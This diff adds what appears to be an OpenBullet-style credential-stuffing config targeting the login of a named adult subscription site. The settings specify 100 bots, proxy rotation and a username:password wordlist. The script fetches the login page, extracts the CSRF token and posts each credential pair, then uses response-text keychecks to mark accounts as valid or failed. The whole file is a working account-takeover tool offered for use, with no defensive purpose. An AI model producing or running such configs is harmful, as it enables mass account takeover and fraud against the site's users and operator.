@@ -1,0 +1,46 @@
+[SETTINGS]
+{
+  "Name": "BangBros",
+  "SuggestedBots": 100,
+  "LastModified": "2018-05-06T12:07:23.31441+00:00",
+  "AdditionalInfo": "",
+  "Author": "Ruri",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#GET_MAIN_PAGE REQUEST GET "http://members.bangbros.com/login" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#PARSE_TOKEN PARSE "<SOURCE>" LR "\"login[_token]\" value=\"" "\"" Recursive=FALSE -> VAR "TOKEN" "" "" 
+#LOGIN REQUEST POST "http://members.bangbros.com/login_check" AutoRedirect=TRUE 
+  CONTENT "login%5Busername%5D=<USER>&login%5Bpassword%5D=<PASS>&profiler_input=&login%5BioBB%5D%5BioBB%5D=&login%5B_token%5D=<TOKEN>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  COOKIE "device_view: full" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "No thanks, take me to the site" 
+  KEYCHAIN Failure OR 
+    KEY "Wrong username/password!" 
+    KEY "Login error has occured.  Please contact customer support" 
+    KEY "UNLOCK OUR ENTIRE LIBRARY OF WEBSITES." 
